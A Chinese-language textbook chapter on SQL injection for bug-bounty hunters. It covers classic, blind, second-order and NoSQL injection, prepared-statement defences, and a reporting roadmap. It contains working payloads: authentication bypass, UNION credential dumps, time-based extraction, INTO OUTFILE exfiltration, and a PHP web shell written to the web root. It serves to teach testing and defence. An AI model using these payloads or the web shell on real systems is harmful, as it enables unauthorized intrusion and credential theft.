# 第11章：SQL注入（SQL Injection）

SQL 是一种用于查询或修改数据库中存储信息的编程语言。SQL 注入是一种攻击，攻击者通过向 SQL 语句中插入恶意输入，从而在应用程序的数据库上执行任意 SQL 命令。当 SQL 查询中使用的输入未经过正确过滤或转义时，就会发生这种情况，可能导致身份验证绕过、敏感数据泄露、数据库篡改，在某些情况下甚至导致 RCE。

SQL 注入正在减少，因为大多数 Web 框架现在都有内置的防护机制。但它们仍然很常见。如果你能找到一个，它们往往是严重漏洞，会导致高额赏金，因此当你刚开始对目标进行漏洞挖掘时，寻找它们仍然是值得的。在本章中，我们将讨论如何发现和利用两种类型的 SQL 注入：经典 SQL 注入和盲 SQL 注入。我们还将讨论 NoSQL 数据库中的注入，这些数据库不使用 SQL 查询语言。

请注意，本章中使用的示例基于 MySQL 语法。注入其他数据库类型的代码会略有不同，但总体原理保持不变。

## 机制

要理解 SQL 注入，我们先从理解 SQL 是什么开始。结构化查询语言（SQL）是一种用于管理和与数据库通信的语言。

传统上，数据库包含表、行、列和字段。行和列包含数据，数据存储在单个字段中。假设一个 Web 应用程序的数据库包含一个名为 `Users` 的表（表 11-1）。该表包含三列：ID、Username 和 Password。它还包含三行数据，每行存储不同用户的凭据。

**表 11-1：示例用户数据库表**

| ID | Username | Password |
|----|----------|----------|
| 1  | admin    | t5dJ12rp$fMDEbSWz |
| 2  | vickie   | password123 |
| 3  | jennifer | letmein! |

SQL 语言通过查询帮助你高效地与数据库中存储的数据交互。例如，SQL `SELECT` 语句可用于从数据库中检索数据。以下查询将返回数据库中的整个 `Users` 表：

```sql
SELECT * FROM Users;
```

此查询将返回 `Users` 表中的所有用户名：

```sql
SELECT Username FROM Users;
```

最后，此查询将返回所有用户名为 `admin` 的用户：

```sql
SELECT * FROM Users WHERE Username='admin';
```

构造与数据库交互的 SQL 查询还有许多其他方式。你可以从 W3Schools 的 SQL 教程中了解更多 SQL 语法：https://www.w3schools.com/sql/default.asp。

### 向 SQL 查询注入代码

当攻击者能够将代码注入目标 Web 应用程序用于访问数据库的 SQL 语句中，从而执行攻击者想要的任何 SQL 代码时，就会发生 SQL 注入攻击。例如，假设一个网站提示用户输入用户名和密码，然后将它们插入 SQL 查询中以登录用户。以下 POST 请求参数将用于填充 SQL 查询：

```
POST /login
Host: example.com
(POST request body)
username=vickie&password=password123
```

此 SQL 查询将查找与 POST 请求中提供的用户名和密码匹配的用户 ID，然后登录该用户账户：

```sql
SELECT Id FROM Users
WHERE Username='vickie' AND Password='password123';
```

那么问题出在哪里？既然用户无法预测他人的密码，他们应该无法以他人身份登录，对吗？问题在于攻击者可以插入对 SQL 语言具有特殊含义的字符来扰乱查询逻辑。例如，如果攻击者提交以下 POST 请求：

```
POST /login
Host: example.com
(POST request body)
username="admin';-- "&password=password123
```

生成的 SQL 查询将变成：

```sql
SELECT Id FROM Users
WHERE Username='admin';-- ' AND Password='password123';
```

`--` 序列表示 SQL 注释的开始，注释内容不会被解释为代码。因此，通过在用户名的查询部分添加 `--`，攻击者有效地注释掉了 SQL 查询的其余部分。查询变成：

```sql
SELECT Id FROM Users WHERE Username='admin';
```

此查询将返回 admin 用户的 ID，而不管攻击者提供的密码是什么。通过在 SQL 查询中注入特殊字符，攻击者绕过了身份验证，可以在不知道正确密码的情况下以 admin 身份登录！

身份验证绕过并不是攻击者通过 SQL 注入所能实现的全部。攻击者还可能能够检索到他们不应被允许访问的数据。假设一个网站允许用户通过向服务器提供用户名和访问密钥来证明身份，从而访问其电子邮件列表：

```
GET /emails?username=vickie&accesskey=ZB6w0YLjzvAVmp6zvr
Host: example.com
```

此 GET 请求可能生成如下 SQL 语句对数据库进行查询：

```sql
SELECT Title, Body FROM Emails
WHERE Username='vickie' AND AccessKey='ZB6w0YLjzvAVmp6zvr';
```

在这种情况下，攻击者可以使用 SQL 查询从他们本不应能读取的其他表中读取数据。例如，假设他们向服务器发送以下 HTTP 请求：

```
GET /emails?username=vickie&accesskey="ZB6w0YLjzvAVmp6zvr'
① UNION SELECT Username, Password FROM Users;-- "
Host: example.com
```

服务器会将原始 SQL 查询转换为：

```sql
① SELECT Title, Body FROM Emails
WHERE Username='vickie' AND AccessKey='ZB6w0YLjzvAVmp6zvr'
② UNION ③SELECT Username, Password FROM Users;④-- ;
```

SQL `UNION` ② 运算符结合了两个不同 `SELECT` 语句的结果。因此，此查询结合了第一个 `SELECT` 语句 ①（返回用户的电子邮件）和第二个 `SELECT` 语句 ③（如前所述，返回 `Users` 表中的所有用户名和密码）的结果。现在攻击者可以在 HTTP 响应中读取所有用户的用户名和密码！（请注意，许多 SQL 注入载荷会注释掉注入点之后的内容 ④，以防止查询的其余部分破坏语法或逻辑。）

SQL 注入不仅限于 `SELECT` 语句。攻击者还可以将代码注入 `UPDATE`（用于更新记录）、`DELETE`（用于删除现有记录）和 `INSERT`（用于在表中创建新条目）等语句中。例如，假设这是目标网站上用于更新用户密码的 HTTP POST 请求：

```
POST /change_password
Host: example.com
(POST request body)
new_password=password12345
```

网站会使用你的新密码和当前登录用户的 ID 形成一条 `UPDATE` 查询。此查询将更新 `Users` 表中 `Id` 字段等于 2 的行，并将其密码设置为 `password12345`：

```sql
UPDATE Users
SET Password='password12345'
WHERE Id = 2;
```

在这种情况下，攻击者可以控制语句的 `SET` 子句，该子句用于指定表中哪些行应被更新。攻击者可以构造如下 POST 请求：

```
POST /change_password
Host: example.com
(POST request body)
new_password="password12345';--"
```

此请求生成以下 SQL 查询：

```sql
UPDATE Users
SET Password='password12345';-- WHERE Id = 2;
```

指定更新条件的 `WHERE` 子句在此查询中被注释掉了。数据库将更新表中的所有行，将 `Users` 表中的所有密码都改为 `password12345`。攻击者现在可以使用该密码以任何人的身份登录。

### 二阶 SQL 注入

到目前为止，我们讨论的 SQL 注入都是一阶 SQL 注入。**一阶 SQL 注入**发生在应用程序直接在 SQL 查询中使用用户提交的输入时。而**二阶 SQL 注入**发生在用户输入被存储到数据库中，然后被检索出来并在 SQL 查询中被不安全地使用时。即使应用程序在用户提交输入时正确处理了输入，如果从数据库检索数据时应用程序错误地将数据视为安全数据，这些漏洞也可能发生。

例如，考虑一个允许用户通过指定用户名和密码创建账户的 Web 应用程序。假设恶意用户提交以下请求：

```
POST /signup
Host: example.com
(POST request body)
username="vickie' UNION SELECT Username, Password FROM Users;--
"&password=password123
```

此请求向 `/signup` 端点提交了用户名 `vickie' UNION SELECT Username, Password FROM Users;--` 和密码 `password123`。用户名 POST 请求参数包含一个 SQL 注入载荷，该载荷将 `SELECT` 所有用户名和密码并将它们与数据库查询结果拼接。

应用程序在提交时正确处理了用户输入，使用了下一节将要讨论的保护技术。字符串 `vickie' UNION SELECT Username, Password FROM Users;--` 作为攻击者的用户名存储到应用程序的数据库中。

之后，恶意用户通过以下 GET 请求访问其电子邮件：

```
GET /emails
Host: example.com
```

在这种情况下，假设如果用户未提供用户名和访问密钥，应用程序将从数据库中检索当前登录用户的用户名，并使用它填充 SQL 查询：

```sql
SELECT Title, Body FROM Emails
WHERE Username='USERNAME'
```

但攻击者的用户名包含 SQL 代码，将 SQL 查询变成：

```sql
SELECT Title, Body FROM Emails
WHERE Username='vickie'
UNION SELECT Username, Password FROM Users;--
```

这将以电子邮件标题和正文的形式在 HTTP 响应中返回所有用户名和密码！

## 防御措施

由于 SQL 注入对应用程序安全性具有毁灭性影响，你必须采取行动加以预防。预防 SQL 注入的一种方法是使用**预编译语句**。预编译语句也称为参数化查询，它们使 SQL 注入几乎不可能发生。

在深入了解预编译语句的工作原理之前，理解 SQL 查询的执行过程很重要。SQL 是一种编程语言，你的 SQL 查询本质上是一个程序。当 SQL 程序到达 SQL 服务器时，服务器会对其进行解析、编译和优化。最后，服务器执行程序并返回执行结果（图 11-1）。

**图 11-1：SQL 查询的生命周期**
`查询 → 解析、编译、优化 → 执行 → 结果`

当你将用户提供的输入插入 SQL 查询时，你实际上是在使用用户输入动态地重写程序。攻击者可以提供干扰程序代码的数据，改变其逻辑（图 11-2）。

**图 11-2：在编译前将用户输入拼接到查询中的 SQL 查询会使数据库将用户输入视为代码**

预编译语句通过确保用户提供的数据不会改变 SQL 查询的逻辑来工作。这些 SQL 语句在任何用户提供的参数插入之前被发送到 SQL 服务器并编译。这意味着，你不是将完整的 SQL 查询传递给服务器编译，而是先定义所有 SQL 逻辑，编译它，然后在执行之前将用户提供的参数插入查询（图 11-3）。参数插入最终查询后，查询将不再被解析和编译。

**图 11-3：在编译后将用户输入拼接到查询中的 SQL 查询允许数据库区分 SQL 查询的代码部分和数据部分**

原始语句中不存在的内容将被视为字符串数据，而非可执行的 SQL 代码，因此 SQL 查询的程序逻辑部分将保持不变。这允许数据库区分 SQL 查询的代码部分和数据部分，无论用户输入是什么样子。

让我们看一个如何在 PHP 中安全执行 SQL 语句的示例。假设我们想使用用户提供的用户名和密码检索用户 ID，因此要执行此 SQL 语句：

```sql
SELECT Id FROM Users
WHERE Username=USERNAME AND Password=PASSWORD;
```

以下是在 PHP 中的做法：

```php
$mysqli = new mysqli("mysql_host", "mysql_username", "mysql_password", "database_name"); ①
$username = $_POST["username"]; ②
$password = $_POST["password"]; ③
```

在 PHP 中，我们首先与数据库建立连接 ①，然后从用户处检索作为 POST 参数的用户名和密码 ②③。

要使用预编译语句，你首先要定义查询的结构。我们写出不带参数的查询，并用问号作为参数的占位符：

```php
$stmt = $mysqli->prepare("SELECT Id FROM Users WHERE Username=? AND Password=?");
```

此查询字符串现在将由 SQL 服务器作为 SQL 代码编译。然后你可以分别发送查询的参数。以下代码行将用户输入插入 SQL 查询：

```php
$stmt->bind_param("ss", $username, $password);
```

最后，执行查询：

```php
$stmt->execute();
```

用户提供的用户名和密码值不会像语句模板那样被编译，也不会作为 SQL 代码的逻辑部分被执行。因此，如果攻击者向应用程序提供类似这样的恶意输入，整个输入将被视为普通数据，而不是 SQL 代码：

```
Password12345';--
```

如何使用预编译语句取决于你编写应用程序所使用的编程语言。维基百科提供了一些示例：https://en.wikipedia.org/wiki/Prepared_statement。

预防 SQL 注入的另一种方法是对允许的值使用白名单。例如，SQL `ORDER BY` 子句允许查询指定对结果进行排序的列。因此，此查询将返回表中用户的所有电子邮件，按 `Date` 列降序排序：

```sql
SELECT Title, Body FROM Emails
WHERE Username='vickie' AND AccessKey='ZB6w0YLjzvAVmp6zvr'
ORDER BY Date DESC;
```

如果应用程序允许用户指定用于排序电子邮件的列，它可以依赖于 `ORDER BY` 子句的列名白名单，而不是允许任意用户输入。例如，应用程序可以只允许值 `Date`、`Sender` 和 `Title`，并拒绝所有其他用户输入值。

最后，你可以仔细清理和转义用户输入。但这种方法并非完全可靠，因为很容易遗漏攻击者可能用来构造 SQL 注入攻击的特殊字符。应清理或转义的特殊字符包括单引号（`'`）和双引号（`"`），但也存在每种数据库类型特有的特殊字符。有关 SQL 输入清理的更多信息，请阅读 OWASP 的速查表：https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html。

## 寻找 SQL 注入

让我们开始寻找 SQL 注入吧！在本章前面，我提到我们可以将 SQL 注入分为一阶和二阶。但在利用时，还有另一种有用的分类方式：经典 SQL 注入和盲 SQL。检测和利用这些类型的方法有所不同。

在深入每种类型之前，检测任何 SQL 注入的常用技术是在每个用户输入中插入单引号字符（`'`）并查找错误或其他异常。单引号是 SQL 语句中的特殊字符，表示查询字符串的结束。如果应用程序受到 SQL 注入保护，它应将单引号视为普通数据，在输入字段中插入单引号不应触发数据库错误或改变数据库查询的逻辑。

另一种查找 SQL 注入的通用方法是模糊测试，即向应用程序提交专门设计的 SQL 注入载荷并监控服务器响应。我们将在第 25 章讨论此内容。

另外，你可以提交为目标数据库设计的载荷，旨在触发数据库响应差异、时间延迟或数据库错误。记住，你要寻找的是你注入的 SQL 代码可以被执行的线索。

### 第 1 步：寻找经典 SQL 注入

经典 SQL 注入是最容易发现和利用的。在经典 SQL 注入中，SQL 查询的结果会直接通过 HTTP 响应返回给攻击者。有两种子类型：基于 UNION 和基于错误。

我们之前的电子邮件示例是基于 UNION 方法的一个案例：攻击者使用 `UNION` 运算符将另一个查询的结果拼接到 Web 应用程序的响应中：

```sql
SELECT Title, Body FROM Emails
WHERE Username='vickie' AND AccessKey='ZB6w0YLjzvAVmp6zvr'
UNION SELECT Username, Password FROM Users;-- ;
```

在这种情况下，服务器会在 HTTP 响应中返回所有用户名和密码以及用户 vickie 的电子邮件（表 11-2）。

**表 11-2：我们的恶意查询产生的电子邮件**

| Title | Body |
|-------|------|
| Finish setting up your account! | Please finish setting up your example.com account by submitting a recovery email address |
| Welcome | admin |
| Welcome to example.com's email service | t5dJ12rp$fMDEbSWz |
| | password123 |
| | vickie |
| | jennifer |
| | letmein! |

另一方面，基于错误的 SQL 注入攻击会触发数据库中的错误，从返回的错误消息中收集信息。例如，我们可以在 MySQL 中使用 `CONVERT()` 函数诱导错误：

```sql
SELECT Title, Body FROM Emails
WHERE Username='vickie' AND AccessKey='ZB6w0YLjzvAVmp6zvr'
UNION SELECT 1,
CONVERT((SELECT Password FROM Users WHERE Username="admin"), DATE); –-
```

`CONVERT(VALUE, FORMAT)` 函数尝试将 `VALUE` 转换为 `FORMAT` 指定的格式。因此，此查询将强制数据库将 admin 的密码转换为日期格式，有时会导致数据库抛出像这样的描述性错误：

```
Conversion failed when trying to convert "t5dJ12rp$fMDEbSWz" to data type "date".
```

数据库抛出描述性错误是为了帮助开发人员定位问题，但如果错误消息也显示给普通用户，则可能意外地向外界泄露信息。在此示例中，数据库指出它未能将字符串值 `"t5dJ12rp$fMDEbSWz"` 转换为日期格式。但 `t5dJ12rp$fMDEbSWz` 是 admin 账户的密码！通过显示描述性错误消息，数据库意外地向外界泄露了敏感信息。

### 第 2 步：寻找盲 SQL 注入

也称为推断型 SQL 注入，盲 SQL 注入检测和利用起来稍微困难一些。当攻击者无法直接从数据库中提取信息，因为应用程序不返回 SQL 数据或描述性错误消息时，就会发生这种情况。在这种情况下，攻击者可以通过向服务器发送 SQL 注入载荷并观察其后续行为来推断信息。盲 SQL 注入也有两种子类型：基于布尔和基于时间。

**基于布尔的 SQL 注入**发生在攻击者通过向 SQL 查询中注入测试条件（返回 `true` 或 `false`）来推断数据库结构时。利用这些响应，攻击者可以慢慢推断数据库内容。例如，假设 example.com 维护一个单独的表来跟踪平台上的高级会员。高级会员可以访问高级功能，其首页显示 “Welcome, premium member!” 横幅。站点通过使用包含用户 ID 的 Cookie，并将其与已注册高级会员表匹配来确定谁是高级会员。包含此类 Cookie 的 GET 请求可能如下所示：

```
GET /
Host: example.com
Cookie: user_id=2
```

应用程序使用此请求生成以下 SQL 查询：

```sql
SELECT * FROM PremiumUsers WHERE Id='2';
```

如果此查询返回数据，则该用户是高级会员，将显示 “Welcome, premium member!” 横幅。否则，不会显示横幅。假设你的账户不是高级会员。如果你提交此用户 ID 会怎样？

```
2' UNION SELECT Id FROM Users
WHERE Username = 'admin'
and SUBSTR(Password, 1, 1) ='a';--
```

好吧，查询将变成：

```sql
SELECT * FROM PremiumUsers WHERE Id='2'
UNION SELECT Id FROM Users
WHERE Username = 'admin'
and ①SUBSTR(Password, 1, 1) = 'a';--
```

`SUBSTR(STRING, POSITION, LENGTH)` 函数从字符串中提取指定位置、指定长度的子串。因此，`SUBSTR(Password, 1, 1)` ① 返回每个用户密码的第一个字符。由于用户 2 不是高级会员，此查询是否返回数据将取决于第二个 `SELECT` 语句，该语句在 admin 账户密码以 `a` 开头时返回数据。这意味着你可以暴力破解 admin 的密码；如果你将此用户 ID 作为 Cookie 提交，Web 应用程序会在 admin 账户密码以 `a` 开头时显示高级横幅。你可以尝试 b、c 等字母，直到成功。

你可以使用此技术提取数据库中的关键信息，如数据库版本、表名、列名和凭据。我将在 “提升攻击影响” 部分（第 201 页）详细讨论。

**基于时间的 SQL 注入**与之类似，但不是依赖 Web 应用程序中的视觉线索，攻击者依赖不同 SQL 注入载荷引起的响应时间差异。例如，如果我们前面的示例中的注入点没有返回关于查询结果的任何视觉线索会怎样？假设高级会员没有特殊横幅，其用户界面看起来没有任何不同。那么你如何利用此 SQL 注入呢？

在许多数据库中，你可以通过 SQL 查询触发时间延迟。如果发生时间延迟，你就知道查询正常工作。尝试在 SQL 查询中使用 `IF` 语句：

```sql
IF(CONDITION, IF-TRUE, IF-FALSE)
```

例如，假设你提交以下 ID：

```sql
2' UNION SELECT
IF(SUBSTR(Password, 1, 1) = 'a', SLEEP(10), 0)
Password FROM Users
WHERE Username = 'admin';
```

SQL 查询将变为：

```sql
SELECT * FROM PremiumUsers WHERE Id='2'
UNION SELECT
IF(SUBSTR(Password, 1, 1) = 'a', SLEEP(10), 0)
Password FROM Users
WHERE Username = 'admin';
```

MySQL 中的 `SLEEP(SECONDS)` 函数会在响应中创建指定秒数的时间延迟。此查询将指示数据库在 admin 密码以 `a` 开头时休眠 10 秒。利用此技术，你可以慢慢找出 admin 的密码。

### 第 3 步：通过 SQL 注入外泄信息

假设你攻击的 Web 应用程序不会立即在你的输入中使用 SQL 查询。相反，它在后端操作期间在 SQL 查询中不安全地使用输入，因此你无法通过 HTTP 响应检索注入结果，也无法通过观察服务器行为推断查询结果。有时甚至在你提交载荷和载荷被用于不安全查询之间存在时间延迟，因此你无法立即观察到应用程序行为的差异。

在这种情况下，你需要在执行不安全 SQL 查询时让数据库将信息存储在某个地方。在 MySQL 中，`SELECT...INTO` 语句告诉数据库将查询结果存储在本地机器的输出文件中。例如，以下查询将导致数据库将 admin 的密码写入 `/var/www/html/output.txt`，这是目标 Web 服务器 Web 根目录下的一个文件：

```sql
SELECT Password FROM Users WHERE Username='admin'
INTO OUTFILE '/var/www/html/output.txt'
```

我们上传到 `/var/www/html` 目录，因为这是许多 Linux Web 服务器的默认 Web 目录。然后你可以简单地在目标上访问 `/output.txt` 页面：`https://example.com/output.txt`。这种技术也是检测二阶 SQL 注入的好方法，因为在二阶 SQL 注入中，恶意输入与 SQL 查询执行之间通常存在时间延迟。

让我们将这些信息放在上下文中。假设当你浏览 example.com 时，应用程序将你添加到一个数据库表中以跟踪当前活跃用户。使用 Cookie 访问页面，如下所示：

```
GET /
Host: example.com
Cookie: user_id=2, username=vickie
```

将导致应用程序将你添加到活跃用户表中。在此示例中，`ActiveUsers` 表仅包含两列：一列用于用户 ID，一列用于登录用户的用户名。应用程序使用 `INSERT` 语句将你添加到 `ActiveUsers` 表中。`INSERT` 语句向指定表中添加一行具有指定值的记录：

```sql
INSERT INTO ActiveUsers
VALUES ('2', 'vickie');
```

在这种情况下，攻击者可以构造恶意 Cookie 注入 `INSERT` 语句：

```
GET /
Host: example.com
Cookie: ①user_id="2', (SELECT Password FROM Users
WHERE Username='admin'
INTO OUTFILE '/var/www/html/output.txt'));-- ", username=vickie
```

此 Cookie ① 将导致 `INSERT` 语句将 admin 的密码保存到受害者服务器上的 `output.txt` 文件中：

```sql
INSERT INTO ActiveUsers
VALUES ('2', (SELECT Password FROM Users
WHERE Username='admin'
INTO OUTFILE '/var/www/html/output.txt'));-- ', 'vickie');
```

最后，你会在目标服务器上的 `output.txt` 文件中找到 admin 账户的密码。

### 第 4 步：寻找 NoSQL 注入

数据库并不总是使用 SQL。NoSQL（Not Only SQL）数据库是指不使用 SQL 语言的数据库。与将数据存储在表中的 SQL 数据库不同，NoSQL 数据库将数据存储在其他结构中，如键值对和图。NoSQL 查询语法因数据库而异，查询通常用应用程序的编程语言编写。现代 NoSQL 数据库，如 MongoDB、Apache CouchDB 和 Apache Cassandra，也容易受到注入攻击。随着 NoSQL 越来越流行，这些漏洞也越来越常见。

以 MongoDB 为例。在 MongoDB 语法中，`Users.find()` 返回满足特定条件的用户。例如，以下查询返回用户名为 `vickie`、密码为 `password123` 的用户：

```javascript
Users.find({username: 'vickie', password: 'password123'});
```

如果应用程序使用此功能登录用户，并直接用用户输入填充数据库查询，如下所示：

```javascript
Users.find({username: $username, password: $password});
```

攻击者可以提交密码 `{$ne: ""}` 以任何人的身份登录。例如，假设攻击者提交用户名为 `admin`，密码为 `{$ne: ""}`。数据库查询将变为：

```javascript
Users.find({username: 'admin', password: {$ne: ""}});
```

在 MongoDB 中，`$ne` 选择值不等于指定值的对象。这里，查询将返回用户名为 `admin` 且密码不等于空字符串的用户，除非 admin 的密码为空，否则该条件为真！攻击者因此可以绕过身份验证并访问 admin 账户。

向 MongoDB 查询注入还可以允许攻击者在服务器上执行任意 JavaScript 代码。在 MongoDB 中，`$where`、`mapReduce`、`$accumulator` 和 `$function` 操作允许开发人员运行任意 JavaScript。例如，你可以在 `$where` 操作符中定义一个函数来查找名为 `vickie` 的用户：

```javascript
Users.find( { $where: function() {
  return (this.username == 'vickie') } } );
```

假设开发人员允许在此函数中传入未验证的用户输入，并用它来获取账户数据，如下所示：

```javascript
Users.find( { $where: function() {
  return (this.username == $user_input) } } );
```

在这种情况下，攻击者可以通过向 `$where` 操作注入任意 JavaScript 代码来执行它。例如，以下恶意代码将通过触发永不结束的 `while` 循环发起拒绝服务（DoS）攻击：

```javascript
Users.find( { $where: function() {
  return (this.username == 'vickie'; while(true){};) } } );
```

寻找 NoSQL 注入的过程类似于检测 SQL 注入。你可以在用户输入字段中插入特殊字符，如引号（`'`、`"`）、分号（`;`）、反斜杠（`\`）以及括号（`()`）、方括号（`[]`）和花括号（`{}`），并查找错误或其他异常。你也可以使用工具 NoSQLMap（https://github.com/codingo/NoSQLMap/）自动化寻找过程。

开发人员可以通过验证用户输入和避免危险的数据库功能来防止 NoSQL 注入攻击。在 MongoDB 中，你可以通过在命令行中使用 `--noscripting` 选项或将配置文件中的 `security.javascriptEnabled` 标志设置为 `false` 来禁用服务器端 JavaScript 的运行。更多信息请访问 https://docs.mongodb.com/manual/faq/fundamentals/index.html。

此外，在给应用程序分配权限时，应遵循最小权限原则。这意味着应用程序应仅以其运行所需的最小权限运行。例如，当应用程序仅需要读取文件时，不应授予任何写入或执行权限。这将降低攻击期间系统完全受损的风险。

## 提升攻击影响

攻击者最常使用 SQL 注入从数据库中提取信息。成功通过 SQL 注入收集数据是一项技术性任务，有时可能很复杂。以下是一些可用于获取目标信息以进行利用的技巧。

### 了解数据库

首先，获取数据库结构的信息很有用。注意，我在本章中使用的许多载荷都需要对数据库有所了解，如表名和字段名。

首先，你需要确定数据库软件及其结构。尝试一些试错 SQL 查询以确定数据库版本。每种数据库都有不同的返回版本号的函数，但查询应类似这样：

```sql
SELECT Title, Body FROM Emails
WHERE Username='vickie'
UNION SELECT 1, @@version;--
```

查询版本类型的一些常用命令是：Microsoft SQL Server 和 MySQL 使用 `@@version`，PostgreSQL 使用 `version()`，Oracle 使用 `v$version`。`UNION SELECT 1, DATABASE_VERSION_QUERY;--` 行中的 `1` 是必要的，因为要使 `UNION` 语句生效，它连接的两个 `SELECT` 语句需要有相同数量的列。第一个 `1` 本质上是你可以用来匹配列数的虚拟列名。

一旦知道正在使用的数据库类型，你就可以开始进一步探查其内容。MySQL 中的以下查询将显示用户定义的表名：

```sql
SELECT Title, Body FROM Emails
WHERE Username='vickie'
UNION SELECT 1, table_name FROM information_schema.tables
```

以下查询将显示指定表的列名。在此示例中，查询将列出 `Users` 表中的列：

```sql
SELECT Title, Body FROM Emails
WHERE Username='vickie'
UNION SELECT 1, column_name FROM information_schema.columns
WHERE table_name = 'Users'
```

所有这些技术在经典和盲注入中都是可行的。你只需要找到一种将那些命令适配到你构造的查询中的不同方法。例如，你可以使用基于时间的技术确定数据库版本，如下所示：

```sql
SELECT * FROM PremiumUsers WHERE Id='2'
UNION SELECT IF(SUBSTR(@@version, 1, 1) = '1', SLEEP(10), 0); --
```

了解数据库结构后，开始针对特定表以提取你感兴趣的数据。

### 获取 Web Shell

提升 SQL 注入影响的另一种方法是尝试在服务器上获取 Web Shell。假设我们针对的是 PHP 应用程序。以下 PHP 代码将获取名为 `cmd` 的请求参数并将其作为系统命令执行：

```php
<? system($_REQUEST['cmd']); ?>
```

你可以利用 SQL 注入漏洞将此 PHP 代码上传到服务器上你可以访问的位置，使用 `INTO OUTFILE`。例如，你可以将不存在的用户的密码和 PHP 代码 `<? system($_REQUEST['cmd']); ?>` 写入目标服务器上的 `/var/www/html/shell.php` 文件：

```sql
SELECT Password FROM Users WHERE Username='abc'
UNION SELECT "<? system($_REQUEST['cmd']); ?>"
INTO OUTFILE "/var/www/html/shell.php"
```

由于不存在用户的密码为空，你实际上是将 PHP 脚本上传到了 `shell.php` 文件。然后你只需访问 `shell.php` 文件并执行任何想要的命令：

```
http://www.example.com/shell.php?cmd=COMMAND
```

## 自动化 SQL 注入

手动测试 SQL 注入不可扩展。我建议使用工具帮助你自动化本章描述的整个过程，从 SQL 注入发现到利用。例如，sqlmap（http://sqlmap.org/）是一个用 Python 编写的工具，可自动化检测和利用 SQL 注入漏洞的过程。sqlmap 的完整教程超出了本书范围，但你可以在 https://github.com/sqlmapproject/sqlmap/wiki/ 找到其文档。

在使用 sqlmap 自动化攻击之前，请确保你理解其每种技术，以便优化攻击。它使用的大多数技术都涵盖在本章中。你可以将 sqlmap 作为独立工具使用，或将其与你正在使用的测试代理集成。例如，你可以通过安装 SQLiPy Burp 插件将 sqlmap 集成到 Burp 中。

## 找到你的第一个 SQL 注入！

SQL 注入是一个令人兴奋的漏洞，值得发现和利用，因此请在练习应用程序或漏洞赏金计划中尝试寻找一个。由于 SQL 注入有时利用起来相当复杂，如果需要，可以先攻击像 Damn Vulnerable Web Application（http://www.dvwa.co.uk/）这样的故意存在漏洞的应用程序进行练习。然后按照此路线图开始在实际环境中寻找真实的 SQL 注入漏洞：

1. **映射应用程序中接受用户输入的所有端点**。
2. **向这些位置插入测试载荷**，以发现它们是否易受 SQL 注入攻击。如果端点不易受经典 SQL 注入攻击，请尝试推断技术。
3. **确认端点易受 SQL 注入攻击后**，使用不同的 SQL 注入查询从数据库中泄露信息。
4. **提升问题严重性**。弄清楚你可以从端点泄露哪些数据，以及你是否可以实现身份验证绕过。注意不要执行任何会破坏目标数据库完整性的操作，如删除用户数据或修改数据库结构。
5. **最后，起草你的第一份 SQL 注入报告**，并提供示例载荷供安全团队复现。由于 SQL 注入大多数时候利用起来相当技术性，花些时间制作易于理解的概念验证是个好主意。
